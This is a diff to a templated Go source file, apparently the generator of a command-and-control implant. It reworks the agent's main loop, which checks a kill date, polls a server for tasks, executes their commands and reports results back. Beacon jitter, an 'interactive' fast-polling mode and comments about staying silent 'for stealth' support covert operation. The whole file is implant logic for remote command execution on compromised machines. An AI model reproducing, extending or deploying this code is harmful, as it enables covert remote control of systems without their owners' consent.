@@ -19,7 +19,8 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 	}
 
 	a.{AGENT_RUNNING_FIELD} = true
-	checkCount := 0
+	interactiveCheckCount := 0
+	regularCheckCount := 0
 
 	for a.{AGENT_RUNNING_FIELD} {
 		// Check kill date on each iteration
@@ -35,72 +36,78 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 			continue
 		}
 
-		// Check interactive status on every iteration to ensure immediate mode switching
-		shouldBeInteractive, err := a.{AGENT_CHECK_INTERACTIVE_STATUS_FUNC}()
-		if err == nil {
-			if shouldBeInteractive && !a.{AGENT_INTERACTIVE_MODE_FIELD} {
-				// Enter interactive mode
-				a.{AGENT_INTERACTIVE_MODE_FIELD} = true
-				// Start dedicated interactive polling
-				go a.{AGENT_START_INTERACTIVE_POLLING_FUNC}()
-			} else if !shouldBeInteractive && a.{AGENT_INTERACTIVE_MODE_FIELD} {
-				// Exit interactive mode
-				// Stop dedicated interactive polling first
-				a.{AGENT_STOP_INTERACTIVE_POLLING_FUNC}()
-				a.{AGENT_INTERACTIVE_MODE_FIELD} = false
-			}
+		// Use the same approach for both interactive and regular modes - get tasks from the queued tasks API
+		// This ensures both regular and interactive tasks are handled with the proven working mechanism
+		tasks, err := a.{AGENT_GET_TASKS_FUNC}()
+		if err != nil {
+			// Failed to get tasks, increment failure counter
+			a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
+			time.Sleep(30 * time.Second)
+			continue
 		} else {
-			_ = err // Use the error variable to avoid unused variable warning
+			a.{AGENT_RESET_FAIL_COUNT_FUNC}() // Reset on successful communication
 		}
 
-		// If not in interactive mode, handle regular tasks
-		if !a.{AGENT_INTERACTIVE_MODE_FIELD} {
-			tasks, err := a.{AGENT_GET_TASKS_FUNC}()
+		// Process all tasks (both regular and interactive)
+		for _, task := range tasks {
+			result := a.{AGENT_PROCESS_COMMAND_FUNC}(task.{TASK_COMMAND_FIELD})
+			taskIDStr := strconv.FormatInt(task.{TASK_ID_FIELD}, 10)
+			err := a.{AGENT_SUBMIT_TASK_RESULT_FUNC}(taskIDStr, result)
 			if err != nil {
-				// Failed to get tasks, but don't print anything for stealth
+				// Failed to submit task result
 				a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
-				time.Sleep(30 * time.Second)
-				continue
 			} else {
-				a.{AGENT_RESET_FAIL_COUNT_FUNC}()  // Reset on successful communication
+				a.{AGENT_RESET_FAIL_COUNT_FUNC}() // Reset on successful result submission
 			}
+		}
 
-
-			for _, task := range tasks {
-				result := a.{AGENT_PROCESS_COMMAND_FUNC}(task.{TASK_COMMAND_FIELD})
-				taskIDStr := strconv.FormatInt(task.{TASK_ID_FIELD}, 10)
-				err := a.{AGENT_SUBMIT_TASK_RESULT_FUNC}(taskIDStr, result)
-				if err != nil {
-					// Failed to submit task result, but don't print anything for stealth
-					a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
-				} else {
-					a.{AGENT_RESET_FAIL_COUNT_FUNC}()  // Reset on successful result submission
+		// Use shorter sleep time in interactive mode for faster response
+		var sleepTime time.Duration
+		if a.{AGENT_INTERACTIVE_MODE_FIELD} {
+			// Check interactive status every 10 iterations in interactive mode
+			interactiveCheckCount++
+			if interactiveCheckCount >= 10 {
+				shouldBeInteractive, statusErr := a.{AGENT_CHECK_INTERACTIVE_STATUS_FUNC}()
+				if statusErr == nil && !shouldBeInteractive {
+					// Server indicates we should exit interactive mode
+					a.{AGENT_INTERACTIVE_MODE_FIELD} = false
 				}
+				interactiveCheckCount = 0 // Reset counter
+			}
+			// Short sleep for quick response in interactive mode
+			sleepTime = 2 * time.Second
+		} else {
+			// Check interactive status every 3 iterations in regular mode
+			regularCheckCount++
+			if regularCheckCount >= 3 {
+				shouldBeInteractive, err := a.{AGENT_CHECK_INTERACTIVE_STATUS_FUNC}()
+				if err == nil {
+					// Update interactive mode based on server status
+					if shouldBeInteractive {
+						a.{AGENT_INTERACTIVE_MODE_FIELD} = true
+					}
+				} else {
+					_ = err // Use the error variable to avoid unused variable warning
+				}
+				regularCheckCount = 0 // Reset counter
 			}
 
 			// In regular mode, use profile-defined heartbeat and jitter
 			baseSleep := float64(a.{AGENT_HEARTBEAT_INTERVAL_FIELD})
 			jitterFactor := (rand.Float64() - 0.5) * 2 * a.{AGENT_JITTER_FIELD}
-			sleepTime := baseSleep * (1 + jitterFactor)
-			if sleepTime < 5 {
-				sleepTime = 5
+			sleepTimeFloat := baseSleep * (1 + jitterFactor)
+			if sleepTimeFloat < 5 {
+				sleepTimeFloat = 5
 			}
-
-			time.Sleep(time.Duration(sleepTime) * time.Second)
-		} else {
-			// In interactive mode, we rely on the dedicated polling goroutine
-			// Sleep for a short time to avoid busy-waiting
-			time.Sleep(1 * time.Second)
+			sleepTime = time.Duration(sleepTimeFloat) * time.Second
 		}
 
-		checkCount++
+		time.Sleep(sleepTime)
 	}
 }
 
 func (a *{AGENT_STRUCT_NAME}) {AGENT_STOP_FUNC}() {
 	a.{AGENT_RUNNING_FIELD} = false
-	// Stop interactive polling if running
-	if a.{AGENT_INTERACTIVE_MODE_FIELD} {
-		a.{AGENT_STOP_INTERACTIVE_POLLING_FUNC}()
-	}
+	a.{AGENT_INTERACTIVE_MODE_FIELD} = false
+	// No need for separate interactive polling goroutine anymore
 }
